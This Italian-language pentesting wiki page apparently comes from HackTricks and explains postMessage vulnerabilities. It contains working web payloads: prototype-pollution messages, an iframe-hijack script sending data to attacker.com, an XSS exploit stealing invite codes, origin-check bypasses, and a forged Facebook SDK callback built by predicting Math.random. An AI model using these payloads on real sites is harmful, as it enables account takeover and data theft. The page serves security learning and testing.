# PostMessage Vulnerabilità

{{#include ../../banners/hacktricks-training.md}}

## Invio di **PostMessage**

**PostMessage** usa la seguente funzione per inviare un messaggio:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Nota che **targetOrigin** può essere '\*' o un URL come _https://company.com._\
Nel **secondo scenario**, il **messaggio può essere inviato solo a quel dominio** (anche se l'origin dell'oggetto Window è diverso).\
Se viene usato il **wildcard**, **i messaggi possono essere inviati a qualsiasi dominio**, e saranno inviati all'origin dell'oggetto Window.

### Attacco a iframe & wildcard in **targetOrigin**

Come spiegato in [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) se trovi una pagina che può essere **iframed** (no `X-Frame-Header` protection) e che sta **inviando messaggi sensibili** via **postMessage** usando un **wildcard** (\*), puoi **modificare** l'**origin** dell'**iframe** e **leak** il messaggio **sensibile** a un dominio controllato da te.\
Nota che se la pagina può essere iframed ma il **targetOrigin** è **impostato su un URL e non su un wildcard**, questo **trucco non funzionerà**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** è la funzione usata da JS per dichiarare la funzione che **si aspetta `postMessages`**.\
Verrà usato un codice simile al seguente:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Nota in questo caso come la **prima cosa** che il codice fa è **controllare l'origine**. Questo è estremamente **importante**, soprattutto se la pagina deve fare **qualcosa di sensibile** con le informazioni ricevute (per esempio cambiare una password). **If it doesn't check the origin, attackers can make victims send arbitrary data to this endpoints** e cambiare le password delle victims (in questo esempio).

### Enumerazione

Per **trovare gli event listeners** nella pagina corrente puoi:

- **Cercare** nel codice JS `window.addEventListener` e `$(window).on` (_JQuery version_)
- **Eseguire** nella console degli strumenti per sviluppatori: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Andare in** _Elements --> Event Listeners_ negli strumenti per sviluppatori del browser

![](<../../images/image (396).png>)

- Usare un **browser extension** come [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) o [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Queste estensioni intercetteranno **tutti i messaggi** e te li mostreranno.

### Origin check bypasses

- L'attributo **`event.isTrusted`** è considerato sicuro poiché restituisce `True` solo per eventi generati da azioni utente genuine. Anche se è difficile da bypassare se implementato correttamente, la sua importanza nei controlli di sicurezza è notevole.
- L'uso di **`indexOf()`** per la validazione dell'origine negli eventi PostMessage può essere suscettibile a bypass. Un esempio che illustra questa vulnerabilità è:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- Il metodo **`search()`** di `String.prototype.search()` è pensato per regular expressions, non per stringhe. Passare qualcosa che non sia un regexp porta a una conversione implicita in regex, rendendo il metodo potenzialmente insicuro. Questo perché nel regex un punto (.) agisce come wildcard, permettendo di bypassare la validazione con domini appositamente creati. Per esempio:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- La funzione **`match()`**, simile a `search()`, elabora regex. Se la regex è strutturata in modo errato, potrebbe essere soggetta a bypass.
- La funzione **`escapeHtml`** è pensata per sanitizzare gli input escapando caratteri. Tuttavia, non crea un nuovo oggetto escaped ma sovrascrive le proprietà dell'oggetto esistente. Questo comportamento può essere sfruttato. In particolare, se un oggetto può essere manipolato in modo tale che la sua proprietà controllata non riconosca `hasOwnProperty`, `escapeHtml` non funzionerà come previsto. Questo è dimostrato negli esempi sotto:

- Fallimento atteso:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Bypassando l'escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

Nel contesto di questa vulnerabilità, l'oggetto `File` è particolarmente sfruttabile a causa della sua proprietà `name` di sola lettura. Questa proprietà, quando usata nei template, non viene sanitizzata dalla funzione `escapeHtml`, portando a potenziali rischi di sicurezza.

- La proprietà `document.domain` in JavaScript può essere impostata da uno script per accorciare il dominio, permettendo una politica più rilassata della same-origin policy all'interno dello stesso dominio parent.

### e.origin == window.origin bypass

Quando si incorpora una pagina web all'interno di un **sandboxed iframe** usando %%%%%%, è fondamentale capire che l'origine dell'iframe verrà impostata a null. Questo è particolarmente importante quando si gestiscono gli attributi di sandbox e le loro implicazioni su sicurezza e funzionalità.

Specificando **`allow-popups`** nell'attributo sandbox, qualsiasi popup aperto dall'interno dell'iframe eredita le restrizioni sandbox del suo parent. Questo significa che a meno che non sia incluso anche l'attributo **`allow-popups-to-escape-sandbox`**, l'origine della finestra popup sarà anch'essa impostata su `null`, in linea con l'origine dell'iframe.

Di conseguenza, quando un popup viene aperto in queste condizioni e viene inviato un messaggio dall'iframe al popup usando **`postMessage`**, sia il mittente che il ricevente avranno la loro origine impostata a `null`. Questa situazione porta al fatto che **`e.origin == window.origin`** valuti true (`null == null`), perché sia l'iframe che il popup condividono lo stesso valore di origine `null`.

Per maggiori informazioni **leggi**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

È possibile verificare se il messaggio è arrivato dalla stessa window in cui lo script sta ascoltando (particolarmente interessante per i **Content Scripts** delle browser extensions per controllare se il messaggio è stato inviato dalla stessa pagina):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Puoi forzare **`e.source`** di un messaggio a essere null creando un **iframe** che **invia** il **postMessage** e viene **eliminato immediatamente**.

Per maggiori informazioni **leggi:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Per eseguire questi attacchi idealmente sarai in grado di **inserire la pagina web vittima** all'interno di un `iframe`. Ma alcuni header come `X-Frame-Header` possono **impedire** questo **comportamento**.\
In questi scenari puoi comunque usare un attacco meno stealthy. Puoi aprire una nuova tab sull'applicazione web vulnerabile e comunicare con essa:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Rubare il messaggio inviato al child bloccando la pagina principale

Nella pagina seguente puoi vedere come potresti rubare dei **dati sensibili inviati via postmessage** a un **child iframe** bloccando la **pagina principale** prima dell'invio dei dati e sfruttando una **XSS nel child** per **leak the data** prima che vengano ricevuti:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Rubare il messaggio modificando la location dell'iframe

Se puoi iframeare una webpage senza X-Frame-Header che contiene un altro iframe, puoi **cambiare la location di quel child iframe**, quindi se sta ricevendo un **postmessage** inviato usando un **wildcard**, un attacker potrebbe **cambiare** quell'**origin** dell'iframe verso una pagina **controllata** da lui e **rubare** il messaggio:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage to Prototype Pollution e/o XSS

In scenari in cui i dati inviati tramite `postMessage` vengono eseguiti da JS, puoi **iframe** la **page** e **sfruttare** la **prototype pollution/XSS** inviando l'exploit via `postMessage`.

Un paio di ottime spiegazioni di **XSS tramite `postMessage`** si trovano in [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Esempio di un exploit per abusare di **Prototype Pollution e poi XSS** tramite un `postMessage` verso un `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Per **maggiori informazioni**:

- Collegamento alla pagina su [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Collegamento alla pagina su [**XSS**](../xss-cross-site-scripting/index.html)
- Collegamento alla pagina su [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Predicting **`Math.random()`** callback tokens in postMessage bridges

Quando la validazione dei messaggi usa un “shared secret” generato con `Math.random()` (es., `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) e lo stesso helper nomina anche gli iframe dei plugin, puoi recuperare gli output del PRNG e forgiare messaggi trusted:

- **Leak PRNG outputs via `window.name`:** Lo SDK assegna automaticamente i nomi agli iframe dei plugin con `guid()`. Se controlli il top frame, iframe la pagina vittima, quindi naviga l'iframe del plugin verso la tua origin (es., `window.frames[0].frames[0].location='https://attacker.com'`) e leggi `window.frames[0].frames[0].name` per ottenere un output raw di `Math.random()`.
- **Force more outputs without reloads:** Alcuni SDK espongono un percorso di reinit; nell'FB SDK, invocando `init:post` con `{xfbml:1}` si forza `XFBML.parse()`, distruggendo/ricreando l'iframe del plugin e generando nuovi nomi/ID di callback. Ripetute reinit producono quanti output PRNG necessari (attenzione a chiamate interne aggiuntive a `Math.random()` per callback/ID iframe, quindi i solver devono saltare i valori intermedi).
- **Trusted-origin delivery via parameter pollution:** Se un endpoint plugin first-party riflette un parametro non sanitizzato nel payload cross-window (es., `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), puoi iniettare `&type=...&iconSVG=...` preservando l'origin trusted `facebook.com`.
- **Predict the next callback:** Convert leaked iframe names back to floats in `[0,1)` e fornisci diversi valori (anche non consecutivi) a un predittore `Math.random` di V8 (es., basato su Z3). Genera il prossimo `guid()` localmente per forgiare il token di callback atteso.
- **Trigger the sink:** Costruisci i dati di postMessage in modo che il bridge esegua `xd.mpn.setupIconIframe` e inietti HTML in `iconSVG` (es., URL-encoded `<img src=x onerror=...>`), ottenendo DOM XSS dentro l'origin ospitante; da lì, gli iframe same-origin (OAuth dialogs, arbiters, ecc.) possono essere letti.
- **Framing quirks help:** La catena richiede framing. In alcuni webview mobile, `X-Frame-Options` può degradare a un non supportato `ALLOW-FROM` quando è presente `frame-ancestors`, e i parametri di “compat” possono forzare `frame-ancestors` permissivi, abilitando il side channel `window.name`.

#### Esempio minimo di messaggio falsificato
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Riferimenti

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- Per esercitarsi: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
